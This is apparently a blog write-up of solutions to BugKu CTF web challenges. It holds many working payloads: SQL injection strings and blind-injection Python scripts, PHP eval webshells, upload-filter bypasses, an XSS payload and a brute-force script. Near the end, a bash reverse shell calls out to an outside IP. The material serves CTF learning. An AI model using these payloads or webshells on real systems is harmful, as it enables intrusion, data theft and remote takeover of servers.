title: BugKu的web题
author: Qianye
abbrlink: e1368ef8
tags:
  - ctf
categories:
  - ctf
date: 2018-03-03 22:30:00
---
一个真心觉得挺好的平台，挺照顾小白的，题多，知识点涉及范围广，可以学到很多。
<!-- more -->

[BugKu](http://ctf.bugku.com/)

# 矛盾
```bash
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```
payload
```bash
?num=1a
```
# web3
在游览器中禁止javascript的运行，查看源码可得
```bash
&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
```
进行unicode解码
# sql注入
查看源码注意到 `gb2312`编码，易知识宽字节注入。一开始直接用#，一直显示不出结果。
判断字段数
```bash
103.238.227.13:10083/?id=1%df' order by 2 %23
```
查看回显
```bash
103.238.227.13:10083/?id=1%df' union select 1,2 %23
```
得到表名
```bash
103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database() )%23
```
字段名
```bash
103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(column_name) from information_schema.columns where table_name=0x6B6579 )%23
```
脱裤
```bash
103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(id,0x23,string) from `key`)%23
```
# 域名解析

window中在hosts上添加下面一条解析语句，访问该域名，即可得到答案
```bash
120.24.86.145 flag.bugku.com
```
# sql注入1
部分源码
```bash
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
```
发现//xss过滤,会将<>置换掉，从而实现关键字绕过
```bash
$id = strip_tags($id);
```
查看字段数
```bash
http://103.238.227.13:10087/?id=1 o<>rder by 2 --+
```
判断显示位
```bash
http://103.238.227.13:10087/?id=1 un<>ion selec<>t 1,2 --+
```
脱裤
```bash
http://103.238.227.13:10087/?id=1 un<>ion selec<>t 1, (selec<>t hash fro<>m `key` where id=1) %23
```
# 你必须让他停下来
禁止javascript，通过bp截包，不断的发送请求，就会得到flag
# 本地文件包含
```bash
<?php 
    include "waf.php"; 
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
```


构造paylaod
```bash
?hello=1);show_source(%27flag.php%27);var_dump(
```
# 变量1
```bash
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```
注意到提示和最后一条语句可知，让$$args=全局变量，即可打印出flag的值。
```bash
?args=GLOBALS
```
# web5
js编码，控制台，解密可得，提示要大写，把字母全部转换成大写
# 进行uniocode解密和拼接得到
```bash
<script>
function checkSubmit(){
var a=document.getElementById("password");
if("undefined"!=typeof a){
	if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
		return!0;
        alert("Error");
	a.focus();
	return!1}}
document.getElementById("levelQuest").onsubmit=checkSubmit;
</script>
```
在输入框中输入
```bash
67d709b2b54aa2aa648cf6e87a7114f1
```
# flag在index里
根据题意和url便可知构造
```bash
?file=php://filter/read=convert.base64-encode/resource=index.php
```
# 输入密码查看flag
```bash
#coding:utf-8
import requests
import threading
import time
url="http://120.24.86.145:8002/baopo/"
s=requests.session()
def getflag(pwd):
    data={"pwd":pwd}
    response=s.post(url,data=data)
    if "密码不正确，请重新输入" not in response.content.decode("utf-8"):
        print(response.content)
        print("破解成功")
        time.sleep(10)
        exit()
for pwd in range(10000,99999):
    print(pwd)
    getflag(pwd)
```
# 听说备份是是一个好习惯
输入index.php.bak得到源码
```bash
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```
双写key绕过
```bash
?kekeyy1=QNKCDZO&kekeyy2=240610708
```
# 成绩单
普通注入题
判断列数
```bash
id=1'order by 4 #
```
判断显示位
```bash
id=-1' union select 1,2,3,4 %23
```
表名
```bash
id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4 %23
```
字段名
```bash
id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C3467),4 %23
```
脱裤
```bash
id=-1' union select 1,2,(select group_concat(skctf_flag) from fl4g),4 %23
```
# 秋名山司机

[python正则](http://www.runoob.com/python/python-reg-expressions.html)
```bash
#coding:utf-8
import requests
import re
url = 'http://120.24.86.145:8002/qiumingshan/'
s = requests.session()
txt = s.get(url)
exp = re.search(r'(\d+[+\-*])+(\d+)', txt.text).group()
#print(exp)
result = eval(exp)
post = {'value': result}
print(s.post(url, data = post).content)
```
# web 6
通过抓包可知，把返回消息头的flag的值base64两次，赋值给margin，post margin，速度要快，该flag的值是会变的，所以只能通过py实现。

```bash
#coding:utf-8
import requests
import base64
import re
url='http://120.24.86.145:8002/web6/'
s=requests.session()
header=s.get(url).headers
print(header['flag'])
base1=base64.b64decode(header['flag'])
#print(type(base1))
key=base64.b64decode(re.split(':',str(base1))[1])
data={"margin":key}
flag=s.post(url,data=data).content
print(flag)
```
# COOKIE欺骗
通过观察url，base64解密，filename,得到keys.txt。猜测文件名被base64编码传入，将index.php进行base64编码，传入，看到<?php， 注意到url中的num参数，修改一下值，发现返回值变了，猜测通过num的值，来返回index.php源码的第几行代码。写个py遍历一下
```bash
import requests
for i in range(0,50):
    url="http://120.24.86.145:8002/web11/index.php?line=%d&filename=aW5kZXgucGhw"%i
    r=requests.get(url)
    print(r.text)
```
可得源码
```bash
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
	$file_list = array(
		'0' =>'keys.txt',
		'1' =>'index.php',
	);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
	$file_list[2]='keys.php';
}

if(in_array($file, $file_list)){
	$fa = file($file);
	echo $fa[$line];
}
?>

```
分析可得，当Cookie:margin=margin 时，keys.php文件，会包含在$file_list数组中，然后在把keys.php进行base64编码，赋值给filename,就会返回flag.
```bash
?line=&filename=a2V5cy5waHA=
Cookie:margin=margin
```
# xss
过滤了<>,用unicode绕过
```bash
?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e
```
# never give up
访问1p.html，得到源码，对其进行部分base64解码，在url解码可得如下
```bash
var Words =
"<script>window.location.href='http://www.bugku.com';</script> 
<!--";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
?>-->" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
// -->
```
[php://](http://php.net/manual/zh/wrappers.php.php)</br>
由源码可知，id要和0相等，但是不能为零，这时id只能为字符串。
对b的要求长度要大于5,‘111’+b[0]要包含在‘1114’,并且b[0]不等于4,所以用unicode编码，且b前面为%00，让ergegi处理的时候被截断（strlen不会），此时就符合了。
a为php://input,php://input可以读取没有处理过的POST数据,post传入的bugku is a nice plateform! 即可。
最终请求包为：
```bash
POST /test/hello.php?id=q&b=%00144565&a=php://input HTTP/1.1
Host: 120.24.86.145:8006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
X-Forwarded-For: 127.0.0.1, 127.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

bugku is a nice plateform!
```
# welcome to bugkuctf

```bash
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 --> 
 ```
 
 
# 过狗一句话
```bash
<?php $poc="a#s#s#e#r#t"; 
$poc_1=explode("#",$poc); 
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
$poc_2($_GET['s']) ?>
```
[glob](http://www.w3school.com.cn/php/func_filesystem_glob.asp)</br>
[file](http://php.net/manual/zh/function.file.php)</br>
[print_r与var_dump的区别](http://blog.csdn.net/ltx06/article/details/52065330)</br>
给s赋值，命令执行，先读取文件
```bash
http://120.24.86.145:8010/?s=print_r(glob(%22*.*%22))
```
读取flag.txt
```bash
http://120.24.86.145:8010/?s=print_r(file(%22flag.txt%22))
```
# 字符？正则？
```bash
<?php 
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?>
```
[php正则表达式](http://wiki.jikexueyuan.com/project/php/regular-expression.html)</br>
[php正则匹配规则](http://www.runoob.com/regexp/regexp-rule.html)
考查php正则，
```bash
http://120.24.86.145:8002/web10/?id=key2keykeykeykeykey:/c/keya?
```

# 前女友

一开始没注意看源码，没注意到源码中有个code.txt链接。
```bash
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```
考查两点</br>
1.v1不等于v2,但v1和v2的md5加密后相等</br>
2.strcmp漏洞(5.3的之前和之后版本在使用strcmp比较数组和字符串时候的差异。在5.3的版本之后使用这个函数比较会返回0)</br>
```bash
?v1=QNKCDZO&v2=240610708&v3[]=1
```
# login1 
sql约束攻击（上次第三届百越杯，就遇到过，被宿友发现，听宿友装了挺久的笔）</br>
[mysql约束攻击](http://www.freebuf.com/articles/web/124537.html)</br>
注册admin+无数个空格+1账户，相当于注册admin账户，有着相同的权限，然后就能用admin账户登入了

# 各种绕过
```bash
<?php 
highlight_file('flag.php'); 
$_GET['id'] = urldecode($_GET['id']); 
$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
    if ($_GET['uname'] == $_POST['passwd']) 

        print 'passwd can not be uname.'; 

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 

        die('Flag: '.$flag); 

    else 

        print 'sorry!'; 

} 
?>
```
1.将margin进行url编码两次，赋值给id</br>
2.利用sha1()函数的漏洞来绕过。如果把这两个参数为数组，如：?uname[]=a&passwd[]=b，这样在第一处判断时两数组是不同，但在第二处判断时由于sha1()函数无法处理数组类型，将warning并返回false，false=flase,条件成立。</br>
post
```bash
http://120.24.86.145:8002/web7/?id=%25%36%44%25%36%31%25%37%32%25%36%37%25%36%39%25%36%45&uname[]


passwd[]=4
```
# web 8
```bash
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```
[file_put_contents和file_get_contents](http://blog.csdn.net/qq_34642668/article/details/68923105)
php://input可以读取没有经过处理的post请求
```bash
http://120.24.86.145:8002/web8/?fn=php://input&ac=qianye


qianye
```
# 细心

一开始bp抓包，查看包，修改包，没有什么信息，最后，随便尝试一下 ，robots.txt.发现一个不能访问的目录，访问该目录，只看到一行源码
```bash
if ($_GET[x]==$password)
```
完全靠猜，感觉没意思，？x=admin，即可得到flag.
# getwebshell
开始尝试%00截断失败。尝试。</br>
修改第一个[content-type](https://www.cnblogs.com/52fhy/p/5436673.html): 将其中的几个字母改成大写，绕过。</br>
第二个[content-type](http://blog.csdn.net/qq_38135094/article/details/69945249):改成image/jpg。</br>
php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 均尝试修改一下,php5可以。
# INSERT INTO注入
```bash
error_reporting(0);

function getIp(){
$ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}
$ip_arr = explode(',', $ip);
return $ip_arr[0];

}

$host="localhost";
$user="";
$pass="";
$db="";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

mysql_select_db($db) or die("Unable to select database");

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);
```
[$_SERVER](http://php.net/manual/zh/reserved.variables.server.php)</br>
[insert into 攻击的原理](http://blog.csdn.net/hwz2311245/article/details/53941523)</br>
[requests库的详解](https://zhuanlan.zhihu.com/p/33097764)</br>
py解得
```bash
import requests
from requests import ReadTimeout
import string
url="http://120.24.86.145:8002/web15/"
strings=string.ascii_lowercase+string.ascii_uppercase+string.digits
flag=""
for i in range(1,35):
    for str0 in strings:
        payload="11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(4) else 1 end ) and '1'='1".format(str(i),str0)
        header={"x-forwarded-for": payload}
        try:
            response=requests.get(url,headers=header,timeout=3)
        except ReadTimeout :
            flag+=str0
            print(flag)
            break
print(flag)

```

# 这是一个神奇的登入框
[SQL注入-基于报错注入](https://baijiahao.baidu.com/s?id=1577401223226080294&wfr=spider&for=pc)</br>
这题的字符串是双引号括起来的，输入”就会报错，然后就是报错注入了，常用的报错语句上面的链接有。</br>
直接给出payload
```bash
admin_name=1"and multilinestring((select * from(select * from(select group_concat(flag1) from flag1)a)b)) and "1 &admin_passwd=Qianye&submit=GO+GO+GO
```
# 多次
[sql盲注](https://www.jianshu.com/p/65f05e7cc957)
这道题不懂，感觉是盲注，但是又做不出来
# PHP_encrypt_1(ISCCCTF)
下载压缩包，后得源码,这道题有加密密文的，可是下载的文件里竟然没有，出题者应该忘记写上了。</br>


```bash
<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) { 
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?>
```
# 文件包含
查看源码，发现有upload.php页面，上传一个包含一句话的图片，用菜刀连接时，显示_@eval($_POST['Qianye']_ ,猜测<?php ?>被过滤了。
可以用
用</script>绕过
```bash
<script language=php>
@eval($_POST[pupil]);
</script>
```
也可以涨个姿势
```bash
<?=eval($_POST['Qianye']);
```
还是不成功
用大佬的一句话，绕过成功。
得到flag文件，并得到upload.php源码,果然是过滤了<?php ?>
```bash
<?php
//error_reporting(0);
if(!empty($_FILES["file"]))
{
    $allowedExts = array("gif", "jpeg", "jpg", "png");
    @$temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg")
    || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg")
    || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png"))
    && (@$_FILES["file"]["size"] < 102400) && in_array($extension, $allowedExts))
    {
        $filename = date('Ymdhis').rand(1000, 9999).'.'.$extension;
        if(move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename)){
		$url="upload/".$filename;
		$content = file_get_contents($url);
        $content = preg_replace('/<\?php|\?>/i', '_', $content);
        file_put_contents('upload/'.$filename, $content);
        echo "file upload successful!Save in:  " . "upload/" . $filename;

	}else{
        	echo "upload failed!";
	}
    }
    else
    {
        echo "upload failed! allow only jpg,png,gif,jpep";
    }
}
?>

```
# flag.php
一个假的登入框，根据提示输入?hint=1，发现源码
```bash
<?php 
error_reporting(0); 
include_once("flag.php"); 
$cookie = $_COOKIE['ISecer']; 
if(isset($_GET['hint'])){ 
    show_source(__FILE__); 
} 
elseif (unserialize($cookie) === "$KEY") 
{    
    echo "$flag"; 
} 
else { 
?> 
<?php 
} 
$KEY='ISecer:www.isecer.com'; 
?>1
```
Cookie的反序列化
# sql2
[.DS_Store文件泄露](http://www.lijiejie.com/ds_store_exp_ds_store_file_disclosure_exploit)
# 孙XX的博客
# 报错注入
[12中报错语句](http://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26)</br>
[sql注入的详细总结](http://blog.csdn.net/wuqiongrj/article/details/51995016)
空格被过滤可以使用”%09   %0A   %0C   %0D    %0B”替代
过滤了很多，尝试用反引号报错,只能读取30个，字符，改变substr()中的后两个值，多次，拼接成完整的字符Flag
```bash
http://103.238.227.13:10088/index.php?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0aconcat(0x7e,substr((load_file(0x2F7661722F746573742F6B65795F312E706870)),86,146),0x7e)),0x7e)) 
```
# Trim的日记本

# login2
[一个大佬的思路](http://www.bugku.com/thread-80-1-1.html)</br>
union select md5()的姿势，尝试下
```bash
username=a' union select 1,md5(1)-- -&password=1
```
登入成功。出现进程监控系统

过滤了一些东西，导致不能回显，考虑端口反弹</br>
在外网主机上监听
```bash
nc -l -p 8080 -vvv
```
在网站上输入
```bash
|bash -i >& /dev/tcp/23.106.128.52/8080 0>&1
```
之后就可以查看文件，得到flag的文件内容了
# login3
# login4